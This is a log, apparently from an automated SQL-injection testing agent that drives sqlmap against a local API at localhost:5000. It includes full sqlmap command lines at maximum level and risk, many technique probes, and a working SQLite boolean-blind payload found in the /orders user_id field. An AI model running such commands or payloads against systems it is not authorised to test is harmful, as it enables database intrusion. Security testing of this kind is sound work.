INFO - [20:23:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:24:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:24:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:24:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:24:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:24:01] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:24:01] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:24:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:24:03] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:24:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:24:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:24:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:24:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:24:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:24:06] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:24:07] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:24:07] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:24:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:24:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:24:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:24:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:24:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:24:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:24:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:24:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:24:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:24:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:24:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:24:08] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:24:08] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:24:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:24:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:24:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:24:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:24:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:24:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:24:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:24:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:24:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:24:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:24:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:24:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:24:08] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:24:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:24:08] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:24:08] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:24:09] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:24:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:24:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:24:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:24:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:24:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:24:10] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:24:10] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:24:11] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:24:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:24:12] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:24:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:24:13] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:24:14] [WARNING] parameter 'Host' does not seem to be injectable
INFO - [20:24:14] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:24:14] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 7432 times, 404 (Not Found) - 219 times
INFO - [*] ending @ 20:24:14 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/products/test
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/orders -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}'
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:24:18 /2025-09-26/
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:24:20] [INFO] flushing session file
INFO - [20:24:20] [INFO] testing connection to the target URL
INFO - [20:24:21] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:24:21] [INFO] testing if the target URL content is stable
INFO - [20:24:22] [INFO] target URL content is stable
INFO - [20:24:22] [INFO] testing if (custom) POST parameter 'JSON user_id' is dynamic
INFO - [20:24:22] [WARNING] (custom) POST parameter 'JSON user_id' does not appear to be dynamic
INFO - [20:24:22] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON user_id' might not be injectable
INFO - [20:24:22] [INFO] testing for SQL injection on (custom) POST parameter 'JSON user_id'
INFO - [20:24:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:24:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:24:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:24:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:24:22] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:24:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:24:23] [INFO] testing 'Generic inline queries'
INFO - [20:24:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:24:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:24:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:24:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:24:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:24:23] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:24:23] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:24:23] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:24:23] [WARNING] reflective value(s) found and filtering out
INFO - [20:24:23] [WARNING] (custom) POST parameter 'JSON user_id' does not seem to be injectable
INFO - [20:24:23] [INFO] testing if (custom) POST parameter 'JSON product_id' is dynamic
INFO - [20:24:23] [WARNING] (custom) POST parameter 'JSON product_id' does not appear to be dynamic
INFO - [20:24:23] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON product_id' might not be injectable
INFO - [20:24:23] [INFO] testing for SQL injection on (custom) POST parameter 'JSON product_id'
INFO - [20:24:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:24:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:24:24] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:24:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:24:24] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:24:24] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:24:24] [INFO] testing 'Generic inline queries'
INFO - [20:24:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:24:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:24:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:24:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:24:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:24:24] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:24:24] [INFO] testing 'Oracle AND time-based blind'
INFO - [20:24:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:24:24] [WARNING] (custom) POST parameter 'JSON product_id' does not seem to be injectable
INFO - [20:24:24] [INFO] testing if (custom) POST parameter 'JSON quantity' is dynamic
INFO - [20:24:25] [WARNING] (custom) POST parameter 'JSON quantity' does not appear to be dynamic
INFO - [20:24:25] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON quantity' might not be injectable
INFO - [20:24:25] [INFO] testing for SQL injection on (custom) POST parameter 'JSON quantity'
INFO - [20:24:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:24:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:24:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:24:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:24:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:24:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:24:26] [INFO] testing 'Generic inline queries'
INFO - [20:24:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:24:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:24:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:24:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:24:26] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:24:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:24:26] [INFO] testing 'Oracle AND time-based blind'
INFO - [20:24:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:24:26] [WARNING] (custom) POST parameter 'JSON quantity' does not seem to be injectable
INFO - [20:24:26] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:24:26] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 198 times
INFO - [*] ending @ 20:24:26 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/orders (log: attack-logs-dynamic\Create_an_order_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders --output-dir 'attack-logs-dynamic\Create_an_order_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}' --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:24:30 /2025-09-26/
INFO - [20:24:32] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:24:32] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:24:32] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: JSON user_id ((custom) POST)
INFO -     Type: boolean-based blind
INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
INFO -     Payload: {"user_id": "1 AND CASE WHEN 1176=1176 THEN 1176 ELSE JSON(CHAR(76,122,110,113)) END", "product_id": "1", "quantity": "1"}
INFO - ---
INFO - [20:24:32] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:24:32] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'
INFO - [*] ending @ 20:24:32 /2025-09-26/
WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Create_an_order_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders --output-dir 'attack-logs-dynamic\Create_an_order_sqlmap' --batch --level=5 --risk=3 --threads 5 -H 'Content-Type: application/json' --data '{"user_id": "1", "product_id": "1", "quantity": "1"}' --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:24:37 /2025-09-26/
INFO - [20:24:39] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
INFO - JSON data found in POST body. Do you want to process it? [Y/n/q] Y
INFO - [20:24:39] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:24:39] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: JSON user_id ((custom) POST)
INFO -     Type: boolean-based blind
INFO -     Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
INFO -     Payload: {"user_id": "1 AND CASE WHEN 1176=1176 THEN 1176 ELSE JSON(CHAR(76,122,110,113)) END", "product_id": "1", "quantity": "1"}
INFO - ---
INFO - [20:24:40] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:24:40] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
INFO - [20:24:40] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'
INFO - [*] ending @ 20:24:40 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Create_an_order_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/orders/test
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:24:43 /2025-09-26/
INFO - [20:24:46] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:24:46] [INFO] flushing session file
INFO - [20:24:46] [INFO] testing connection to the target URL
INFO - [20:24:46] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:24:46] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:24:46] [INFO] testing if the target URL content is stable
INFO - [20:24:46] [INFO] target URL content is stable
INFO - [20:24:46] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:24:46] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:24:46] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:24:46] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:24:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:24:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:24:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:24:47] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:24:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:24:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:24:47] [INFO] testing 'Generic inline queries'
INFO - [20:24:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:24:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:24:47] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:24:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:24:47] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:24:47] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:24:47] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:24:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:24:47] [WARNING] reflective value(s) found and filtering out
INFO - [20:24:47] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:24:47] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:24:47] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 77 times
INFO - [*] ending @ 20:24:47 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/orders/test (log: attack-logs-dynamic\Get_orders_for_a_user_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders/test --output-dir 'attack-logs-dynamic\Get_orders_for_a_user_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:24:51 /2025-09-26/
INFO - [20:24:53] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_orders_for_a_user_sqlmap' as the output directory
INFO - [20:24:54] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:24:54] [INFO] testing connection to the target URL
INFO - [20:24:54] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:24:54] [INFO] testing if the target URL content is stable
INFO - [20:24:54] [INFO] target URL content is stable
INFO - [20:24:54] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:24:54] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:24:55] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:24:55] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:24:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:24:55] [WARNING] reflective value(s) found and filtering out
INFO - [20:24:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:24:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:24:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:24:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:24:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:25:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:25:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:25:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:25:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:25:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:25:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:25:04] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:25:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:25:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:25:07] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:25:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:25:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:25:10] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:25:11] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:25:12] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:25:13] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:25:14] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:25:15] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:25:17] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:25:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:25:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:25:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:25:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:25:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:25:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:25:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:25:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:25:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:25:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:25:18] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:25:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:25:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:25:18] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
INFO - [20:25:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
INFO - [20:25:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
INFO - [20:25:19] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
INFO - [20:25:20] [INFO] target URL appears to be UNION injectable with 6 columns
INFO - [20:25:23] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
INFO - [20:25:23] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
INFO - [20:25:24] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
INFO - [20:25:25] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
INFO - [20:25:25] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
INFO - [20:25:25] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
INFO - [20:25:26] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
INFO - [20:25:26] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
INFO - [20:25:27] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
INFO - [20:25:27] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
